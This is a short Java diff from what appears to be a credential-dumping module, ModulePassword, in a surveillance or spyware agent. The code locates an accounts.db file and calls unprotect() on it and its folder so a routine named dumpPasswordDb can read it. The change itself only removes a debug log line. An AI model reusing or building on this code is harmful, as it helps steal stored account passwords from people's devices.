@@ -138,12 +138,8 @@ public class ModulePassword extends BaseModule {
 		}
 
 		if (fu.exists() && unprotect(fu.getParent()) && unprotect(fu.getAbsolutePath())) {
-
 			dbFile = fu.getAbsolutePath();
 		} else if (fs.exists() && unprotect(fs.getParent()) && unprotect(fs.getAbsolutePath())) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (dumpPasswordDb) ERROR: no suitable accounts.db");
-			}
 			dbFile = fs.getAbsolutePath();
 		} else {
 			if (Cfg.DEBUG) {
